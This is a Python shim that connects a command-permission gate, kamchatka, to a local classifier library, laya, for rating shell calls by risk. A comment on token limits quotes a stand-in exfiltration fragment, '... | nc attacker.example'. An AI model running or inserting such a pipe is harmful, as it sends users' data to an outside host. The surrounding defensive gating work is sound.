#!/usr/bin/env python3
"""A local System One advisor for kamchatka, backed by laya.

    $ pip install laya
    $ export SYSTEM1_ADVISOR_COMMAND="$HOME/ai/venv/bin/python path/to/laya_advisor.py"
    $ kamchatka --advise

    $ python3 laya_advisor.py --probe "ls -la"      # what laya actually answers, verbatim

note: this exists because laya ships no interface to point a base URL at - no HTTP server, no
CLI, no `python -m laya`. It is a library, so reaching it from another process means a process,
and this is the smallest one that will do.

note: one JSON object per line in, one per line out, in the body kamchatka already builds for the
hosted engine - `{"model": ..., "state": ..., "questions": {...}}` in, `{"model": ...,
"answers": {...}}` out.

note: **the answer is built here rather than passed through, and that is the whole job.** The two
engines agree on the question shape - the same three types, the same names, the same `criteria` -
and they do not agree on the answer. The documented shape carries a `type` on every answer and a
`confidence` meaning *how concentrated the distribution is*; laya's answers are keyed by the
primitive, and its `confidence` is its own quantity.

Passing one through as the other is how `ls` arrives at 1% and is drawn as a command that changes
something: kamchatka will not draw an unsure reading green, so a number that is not a confidence
turns every answer yellow whatever it scored. That rule is right and the input was wrong.

So this reads laya's distribution and computes the field the caller means by the word, and stamps
the `type` from the question that was asked - which is the authoritative source for it, since the
shim is what sent it. Where there is no distribution to work from it falls back to whatever laya
called confidence, which is the case `--probe` exists to make visible.

note: the model loads once, before the first line is read. A 421M-parameter checkpoint costs
seconds to load and milliseconds to run, so loading it per question would put that wait in front
of somebody deciding whether to press `y` - which is the whole thing this kind of model is for
not doing. `preload=True` is laya's own name for paying it up front.

note: it answers every line, including one it could not handle. A shim that stayed silent on a
bad question would leave the caller waiting out its timeout and then closing the pipe, so one
malformed request would cost the advisor for the rest of the session; an `answers` object with
nothing in it is read as nothing having been said about that call, which is the outcome the
caller already handles on every other failure.
"""

import json
import os
import sys

# note: before `laya` is imported anywhere, which is why it is up here rather than beside the
# import. laya's own card warns that `transformers` probes for TensorFlow at import and that
# abseil can then deadlock model construction; what a deadlock costs *here* is the whole
# session's advisor, silently - the child never answers, the warm-up times out after thirty
# seconds, and the pipe closes for good. Nothing on this machine needs the TensorFlow path.
os.environ.setdefault("USE_TF", "0")

# How much of each request laya is given for the question, and for the whole sequence.
#
# note: raised from the checkpoint's own 192 and 512, which is a knob laya's card documents and a
# default this program is the wrong shape for. The budget is split - the options and the
# instructions share `head_max_len`, and the state gets what is left of `max_len` - and a stage of
# a command line travels *in the instructions*, so a long one is cut from the question rather than
# from the state. At the shipped default it is cut at 144 tokens with no marker, which is the
# thing `ROOM`'s `(cut; ...)` exists one file away to prevent: `... | nc attacker.example` is a
# different command from the one somebody is being asked about. ModernBERT-large reads 8192, the
# other two checkpoints already default near this, and nothing measured moved except the cut.
HEAD_MAX_LEN = 512
MAX_LEN = 1024

# One softmax temperature per (question type, option count), refitted for the questions kamchatka
# asks. Anything not named here keeps the checkpoint's own.
#
# note: laya's card says the checkpoint ships over-confident and that refitting these on your own
# data is what makes the probabilities mean anything. The numbers it ships were fitted on its
# domain and are about twice too flat for this one: a three-option `choice` came out at 1.76, and
# a refusal that could not clear the 0.7 the caller compares against is a refusal the caller turns
# into a question. Fitted by minimising NLL over `laya_fit.json` - `--fit` is what recomputes them
# and prints the working.
#
# note: this moves confidence and not decisions. A softmax temperature is monotonic, so which
# option the model picks is identical at any of these; what changes is whether the caller is
# allowed to act on it. That is also why the change is a safe one to make in this direction: the
# advice can only ever tighten, an `allow` decides nothing, and the one harmful error - a
# confident `deny` on ordinary work - does not appear anywhere in the fit set at any temperature
# tried.
#
# note: `choice` was too flat and came down to 0.76, which is the one that goes the way the
# argument above predicts. `score` barely moved and is left where the fit put it, because the
# rubric is the primitive laya's card calls its weakest and there is nothing here to improve it
# with.
#
# note: `noul:2` is fitted over *both* of the claims kamchatka asks - whether a call destroys
# something, and whether a command does - because laya keys a temperature by the question's type
# and option count, so the two share one and there is no way to give them different ones. Fitted
# on the first alone it wants 2.80; the pair wants 1.91. The joint number is the honest one, since
# the joint number is what both questions are going to be answered at.
TEMPERATURES = {
    "choice:3-5": 0.76,
    "noul:2": 1.91,
    "score:3-5": 1.32,
}

# The questions kamchatka actually sends, copied from `kamchatka/src/tools/advice.rs`.
#
# note: a copy, and the hazard is obvious - texts that have to agree, in two languages. What
# stops them drifting is a test: `the_probe_asks_the_question_the_program_asks` in `advisor.rs`
# reads this file and fails if anything the program sends is not in it.
#
# note: worth the copy rather than probing with something illustrative, and that is the lesson
# these constants exist because of. The first `--probe` made up a short rubric of its own and
# reported a different number than the running session did for the same command; the second one
# copied the rubric and still sent a bare command as the state, where the program sends the call.
# Both times the probe measured something nobody runs, and read as evidence while doing it.
LEVELS = [
    "it only looks, or moves about, and leaves nothing changed",
    "it leaves something changed that could be put back",
    "it destroys something that cannot be got back, or sends something off this machine",
]
#
# note: each of these is one literal on one line, however long, because the test that pins them
# reads this file as text and looks for the sentence the program sends. Wrapped across two
# literals the way Python would rather have them, the sentence is not in here to find, and the
# pin quietly stops pinning anything.
DECIDE = "A tool is about to run on the user's machine. What should a permission gate do with the call shown in `arguments`?"  # noqa: E501
DECIDE_CRITERIA = {
    "allow": "ordinary work, and safe to run unattended",
    "ask": "a person should look at this one first",
    "deny": "destructive, or reaches something it has no business reaching",
}
DESTROYS = "Would running the call in `arguments` destroy something that cannot be got back?"
DESTROYS_CRITERIA = {
    "true": "it deletes, overwrites or sends data that cannot be recovered",
    "false": "it only reads, or anything it changes can be undone",
}
PLACE = "A command is about to be run on the user's machine, and a person is about to be asked whether to let it. Place the command in `cmd` on this rubric by what it would do."  # noqa: E501
RUIN = "Would running the command in `cmd` destroy something that cannot be got back, or send something off this machine?"  # noqa: E501
RUIN_CRITERIA = {
    "true": "it destroys something that cannot be got back, or sends something off this machine",
    "false": "it only looks, moves about, or changes something that could be put back",
}


def tuned(router):
    """Gives every checkpoint the router holds the budget and the temperatures above.

    note: after `preload`, because both live on each built agent and are read at the moment a
    question is answered. A checkpoint the router loads later keeps its own defaults, which is the
    one case this misses and is why `preload=True` is not only about latency here.

    note: both knobs are laya's own - it documents raising the budget for questions whose options
    do not fit, and asks for the temperatures to be refitted per domain.
    """
    for name in router.loaded:
        agent = router.load(name)
        agent.cfg["head_max_len"] = max(agent.cfg.get("head_max_len", 0), HEAD_MAX_LEN)
        agent.cfg["max_len"] = max(agent.cfg.get("max_len", 0), MAX_LEN)
        agent.temperature_by_options = dict(agent.temperature_by_options, **TEMPERATURES)

    return router


def checkpoint(state):
    """Which checkpoint answers about this state: the exact signal, not the best-effort one.

    note: laya's router picks by script *and*, within Latin, by a stopword guess at the language -
    and its own card calls the first exact and the second explicitly best-effort. On what this
    program sends, the second is worse than useless: a state is a tool call, so the words it
    guesses from are flags and paths and package names rather than prose. `python -c 'import os,
    sys'` reads as Portuguese, because `os` is a Portuguese stopword and appears twice, and goes
    to a checkpoint the card's own table puts at 0.657 against 0.783 on English.

    note: the script half is kept rather than pinning English outright, because the state is not
    always a command line. `fs:write` carries the text being written, and the card is blunt about
    what the English checkpoint does with a script it cannot read - 0.000 accuracy at 0.952
    confidence, which confidence gating cannot save anybody from. What this gives up is a write of
    French or German prose, which the guess would have routed better.

    note: the script signal is counted over the *whole* state, so the twenty-odd Latin letters a
    call's own wrapper contributes - `write`, `fs:write`, the path - outvote a line or two of
    another script and lose it to the English checkpoint. A paragraph wins; a sentence may not.
    That is laya's own reckoning and not something this changes, and it is written down here
    because it is the case a reader of the note above would otherwise assume is covered.
    """
    from laya import detect_language

    latin = detect_language(state)["script"] in ("latin", "unknown")

    return "english" if latin else "multilingual"


def predict(router, state, asked):
    """One request, on the checkpoint this program picks rather than the one the guess picks."""
    return router.predict(state, asked, model=checkpoint(state))


def call(cmd):
    """The state kamchatka puts a shell call to an advisor as: `advice::state`, exactly.

    note: the call and not the command, which is the thing this got wrong. kamchatka never sends
    a bare command line - it sends what is about to run, with the tool that would run it and the
    capabilities it declared, and the command two levels down under `arguments`. A probe that
    sends `{"cmd": ...}` is asking an easier question than the program asks, and the gap between
    the two answers is large enough to be mistaken for a bug in the rubric.
    """
    return {"tool": "shell", "capabilities": ["exec:run"], "arguments": {"cmd": cmd}}


def gate_questions():
    """What the program asks about a call the standing rules were going to allow."""
    return {
        "verdict": {"type": "choice", "instructions": DECIDE, "criteria": DECIDE_CRITERIA},
        "irreversible": {"type": "noul", "instructions": DESTROYS, "criteria": DESTROYS_CRITERIA},
    }


def rating_questions():
    """And about one the rules were going to ask about, which is what the colour is read off.

    note: both readings of it, because the program asks both and draws the worse of the two. An
    ordinal `score` is the primitive laya's card calls its weakest, and the same reading asked as
    a claim finds commands the rubric misses - so a probe showing one of them would be reporting
    on half of what decides the colour.

    note: the whole command only. The program also puts both to each stage of a command line, and
    where the stages fall is `tools::joints`' business - a second copy of that here would be a
    copy that drifts. A stage is these questions with a fragment in the instructions.
    """
    return {
        "rating": {"type": "score", "instructions": PLACE, "criteria": LEVELS},
        "danger": {"type": "noul", "instructions": RUIN, "criteria": RUIN_CRITERIA},
    }


def number(value, fallback=0.0):
    """`value` as a float where it is one, and `fallback` where it is not."""
    return float(value) if isinstance(value, (int, float)) else fallback


def spread(answer):
    """The distribution as a list of probabilities, or nothing where there is none."""
    found = answer.get("probabilities")
    if isinstance(found, dict):
        return [v for v in found.values() if isinstance(v, (int, float))]
    if isinstance(found, (list, tuple)):
        return [v for v in found if isinstance(v, (int, float))]
    return []


def confidence(answer):
    """How concentrated the distribution is, which is what the caller means by the word.

    note: the largest probability, and not laya's own `confidence`, which is a different
    quantity. Measured: `ls` comes back `{"0": 0.84, "1": 0.08, "2": 0.08}` with a `confidence`
    of 0.49 beside it. What a caller comparing against a threshold is asking is whether the
    model settled on one level or spread itself over several, and 0.84 answers that; 0.49 read
    as one is a model that could not tell, which is how `ls` came to be drawn as a command that
    changes something.

    note: where there is no distribution this falls back to whatever laya called confidence,
    which is better than nothing, and where there is neither the answer goes out at 0.0 - read
    by the caller as "could not tell" rather than as a clean bill.
    """
    probabilities = spread(answer)
    if probabilities:
        return float(max(probabilities))

    return number(answer.get("confidence"))


def answered(kind, answer):
    """One of laya's answers, in the shape the documented API answers in.

    note: built rather than forwarded, and the type comes from the *question* - the
    authoritative source for it, since this is what sent it. laya carries a `type` of its own
    and it has always agreed; trusting the question costs nothing and cannot disagree.

    note: an answer this cannot read is left out rather than guessed at. The caller reads a
    missing answer as nothing having been said about that question, which is an outcome it
    already handles; a fabricated one is a number nobody sent.
    """
    if not isinstance(answer, dict):
        return None

    if kind == "noul":
        # note: a noul's number *is* its confidence, so there is no second field to compute -
        # and laya agrees, sending the same number twice
        if not isinstance(answer.get("noul"), (int, float)):
            return None
        return {"type": "noul", "noul": number(answer["noul"])}

    if kind == "choice":
        if not isinstance(answer.get("choice"), str):
            return None
        return {
            "type": "choice",
            "choice": answer["choice"],
            "confidence": confidence(answer),
            "probabilities": answer.get("probabilities", {}),
        }

    if kind == "score":
        if not isinstance(answer.get("score"), (int, float)):
            return None
        return {
            "type": "score",
            "score": number(answer["score"]),
            "confidence": confidence(answer),
            "legend": answer.get("legend", {}),
            "probabilities": answer.get("probabilities", {}),
        }

    return None


def translated(asked, result):
    """Everything laya answered, by the name and type each question was asked under."""
    raw = result.get("answers", result) if isinstance(result, dict) else {}
    out = {}
    for name, question in asked.items():
        answer = answered(question.get("type"), raw.get(name))
        if answer is not None:
            out[name] = answer

    return out


def probe(command):
    """Prints what laya answers about one command, verbatim and translated.

    note: what this is for is the difference between an engine that cannot place a command and
    one whose answer is being read wrongly. The first block is what laya said; the second is
    what kamchatka would be handed. A `score` in the right place under a flat distribution is
    the rubric being hard to read; a good distribution translated into a bad `confidence` is
    this file.

    note: both requests, because the program makes two and they are not interchangeable. The
    gate's pair decides whether a call runs and is asked about a call the rules would have
    allowed; the rubric is only ever drawn and is asked about one they would have queried. An
    advisor can be useless at one and fine at the other, and a probe that showed one of them
    would say so about both.
    """
    from laya import Router

    router = tuned(Router(preload=True))
    state = call(command)
    print("--- the state kamchatka sends ---")
    print(json.dumps(state, indent=2))

    for what, asked in (("the gate", gate_questions()), ("the rubric", rating_questions())):
        result = predict(router, state, asked)
        print("--- %s: what laya answered, verbatim ---" % what)
        print(json.dumps(result, indent=2, default=str))
        print("--- %s: what this shim would send on ---" % what)
        print(json.dumps(translated(asked, result), indent=2))

    return 0


def selftest() -> int:
    """Checks the translation against a recorded laya-shaped answer, with no laya installed.

    note: the case that sent this file back for a second try. `ls` scores near zero - correctly,
    it only looks - and laya reports a `confidence` of about the same, which is not what the
    caller means by the word. Passed through, that is a reading nobody is sure of, and kamchatka
    will not draw one of those green; every command came out yellow whatever it scored. Read off
    the distribution instead it is 0.97, and `ls` is green.

    note: runnable without the package, which is the point - it is the half of this shim that can
    be wrong on a machine that cannot load a checkpoint, and `cargo test` runs it.
    """
    asked = {
        "rating": {"type": "score", "instructions": "x", "criteria": ["a", "b", "c"]},
        "verdict": {"type": "choice", "instructions": "x", "criteria": {"allow": None}},
        "irreversible": {"type": "noul", "instructions": "x"},
    }
    # note: laya's own answer for `ls`, kept verbatim rather than invented - which is the
    # difference between a test about this translation and a test about what I imagined it
    # translates. The `confidence: 0.4932` beside a distribution that is 84% on one level is
    # the whole reason this file computes its own.
    recorded = {
        "model": "laya-rl-agent",
        "answers": {
            "rating": {
                "type": "score",
                "score": 0.2461,
                "legend": {"0": "…", "1": "…", "2": "…"},
                "probabilities": {"0": 0.8373, "1": 0.0792, "2": 0.0835},
                "confidence": 0.4932,
                "action": {"act_probability": 1.0},
            },
            "verdict": {
                "type": "choice",
                "choice": "allow",
                "confidence": 0.94,
                "probabilities": {"allow": 0.94, "deny": 0.06},
            },
            "irreversible": {"type": "noul", "noul": 0.7399, "confidence": 0.7399},
        },
        "usage": {"input_tokens": 112, "output_tokens": 0},
    }

    out = translated(asked, recorded)

    # every answer carries the type the *question* had, which laya does not send
    assert out["rating"]["type"] == "score", out
    assert out["verdict"]["type"] == "choice", out
    assert out["irreversible"]["type"] == "noul", out

    # the score is laya's own and the confidence is not. 0.2461 is where `ls` landed - the
    # bottom level, correctly - and 0.8373 is how sure it was of landing there. laya's own
    # `confidence` for the same answer is 0.4932, which read as one puts `ls` under every
    # threshold the caller has and draws it as a command that changes something
    assert out["rating"]["score"] == 0.2461, out
    assert out["rating"]["confidence"] == 0.8373, out
    assert out["rating"]["confidence"] != recorded["answers"]["rating"]["confidence"], out
    assert out["verdict"]["confidence"] == 0.94, out

    # a noul's number is its confidence, so there is no second field to invent
    assert out["irreversible"]["noul"] == 0.7399, out
    assert "confidence" not in out["irreversible"], out

    # and nothing laya sends that the documented shape has no room for comes along
    assert "action" not in out["rating"], out

    # an answer this cannot read is left out rather than guessed at, which the caller reads as
    # nothing having been said about that question
    assert translated(asked, {"answers": {"rating": {"nope": 1}}}) == {}, "a shape it cannot read"
    assert translated(asked, {}) == {}, "no answers at all"

    print("laya_advisor: the translation holds")
    return 0


def fit(at=None):
    """Refits one temperature per (question type, option count) over the labelled commands.

    note: this is what `TEMPERATURES` is, and running it is how to replace those numbers with
    ones fitted on traffic of your own - point it at a file shaped like `laya_fit.json`. laya's
    card asks for exactly this and is explicit that the shipped numbers are its domain's.

    note: the fit is over the *raw* scores, recovered by undoing whatever temperature the agent
    applied, so it does not compound with a previous run of itself. Minimising NLL rather than
    ECE, because NLL is what a proper scoring rule reads and ECE on fifty points is bin noise -
    the ECE is printed beside it so a fit that improved one and wrecked the other is visible.

    note: it prints the misfire count, which is the number to read before trusting any of this.
    A lower temperature makes the model surer of everything, wrong answers included; the only
    one that costs anything here is a confident `deny` on ordinary work, because the advice can
    only ever tighten and an `allow` decides nothing.
    """
    import math
    import os.path

    from laya import Router
    from laya.common import QTYPES, temp_bucket

    at = at or os.path.join(os.path.dirname(os.path.abspath(__file__)), "laya_fit.json")
    with open(at) as f:
        cases = json.load(f)["commands"]

    # the shipped temperatures are undone below, so the router is built without them
    router = Router(preload=True)
    for name in router.loaded:
        agent = router.load(name)
        agent.cfg["head_max_len"] = max(agent.cfg.get("head_max_len", 0), HEAD_MAX_LEN)
        agent.cfg["max_len"] = max(agent.cfg.get("max_len", 0), MAX_LEN)

    asked = dict(gate_questions(), **rating_questions())
    # (bucket, [raw log-probabilities], index of the true option)
    seen = []
    for case in cases:
        answers = predict(router, call(case["cmd"]), asked)["answers"]
        agent = router.load(checkpoint(call(case["cmd"])))
        for name, truth in (
            ("verdict", ["allow", "ask", "deny"].index(case["verdict"])),
            ("rating", case["rating"]),
            ("danger", 1 if case["rating"] == 2 else 0),
            ("irreversible", 0 if case["undoable"] else 1),
        ):
            answer = answers.get(name)
            if not answer:
                continue
            keys = (
                list(answer["probabilities"])
                if "probabilities" in answer
                else ["false", "true"]
            )
            spread = (
                [answer["probabilities"][k] for k in keys]
                if "probabilities" in answer
                else [1.0 - answer["noul"], answer["noul"]]
            )
            kind = {"verdict": "choice", "rating": "score"}.get(name, "noul")
            bucket = temp_bucket(QTYPES[kind], len(keys))
            was = agent.temperature_by_options.get(
                bucket, agent.temperature[QTYPES[kind]]
            )
            raw = [math.log(max(p, 1e-9)) * was for p in spread]
            seen.append((bucket, raw, truth))

    def spread_at(raw, t):
        top = max(raw)
        out = [math.exp((z - top) / t) for z in raw]
        total = sum(out)
        return [p / total for p in out]

    print("fitted over %d commands from %s\n" % (len(cases), at))
    # note: `gap` is the mean distance between how sure the model was and whether it was right -
    # not ECE, which bins and needs more than this many points to mean anything
    print(
        "%-12s %-8s %6s %7s %7s %9s %9s"
        % ("bucket", "", "T", "NLL", "gap", "accuracy", "misfires")
    )
    fitted = {}
    shipped_all = router.load("english").temperature_by_options
    for bucket in sorted({b for b, _, _ in seen}):
        rows = [(raw, truth) for b, raw, truth in seen if b == bucket]

        def cost(t, rows=rows):
            return -sum(
                math.log(max(spread_at(raw, t)[truth], 1e-12)) for raw, truth in rows
            ) / len(rows)

        def scored(t, rows=rows):
            gap = hit = misfires = 0.0
            for raw, truth in rows:
                p = spread_at(raw, t)
                right = p.index(max(p)) == truth
                hit += right
                gap += abs(max(p) - (1.0 if right else 0.0))
                # a confident answer that is not the safe one: the only error that costs anything
                if not right and max(p) >= 0.7 and p.index(max(p)) > truth:
                    misfires += 1
            return gap / len(rows), hit / len(rows), int(misfires)

        best = min((round(0.2 + 0.01 * n, 2) for n in range(281)), key=cost)
        fitted[bucket] = best
        for label, t in (("shipped", shipped_all[bucket]), ("fitted", best)):
            gap, hit, misfires = scored(t)
            print(
                "%-12s %-8s %6.2f %7.3f %7.3f %9.3f %9d"
                % (bucket if label == "shipped" else "", label, t, cost(t), gap, hit, misfires)
            )

    print("\nTEMPERATURES = %s" % json.dumps(fitted, indent=4))
    return 0


def main() -> int:
    if len(sys.argv) > 1 and sys.argv[1] == "--selftest":
        return selftest()
    if len(sys.argv) > 1 and sys.argv[1] == "--probe":
        return probe(sys.argv[2] if len(sys.argv) > 2 else "ls -la")
    if len(sys.argv) > 1 and sys.argv[1] == "--fit":
        return fit(sys.argv[2] if len(sys.argv) > 2 else None)

    try:
        from laya import Router
    except ImportError:
        print(
            "laya is not installed in this interpreter: pip install laya",
            file=sys.stderr,
        )
        return 1

    router = tuned(Router(preload=True))
    # note: to stderr, which kamchatka holds rather than inheriting - it would otherwise be
    # written over the screen - and reports as it arrives. It is the line that says the
    # checkpoint has finished loading, which is the one thing somebody waiting wants
    print("ready", file=sys.stderr, flush=True)

    for line in sys.stdin:
        line = line.strip()
        if not line:
            continue

        try:
            request = json.loads(line)
            asked = request["questions"]
            answers = translated(asked, predict(router, request["state"], asked))
        except Exception as e:  # noqa: BLE001 - see the note on answering every line
            print(f"{type(e).__name__}: {e}", file=sys.stderr, flush=True)
            answers = {}

        json.dump({"model": "laya", "answers": answers}, sys.stdout)
        print()
        sys.stdout.flush()

    return 0


if __name__ == "__main__":
    sys.exit(main())
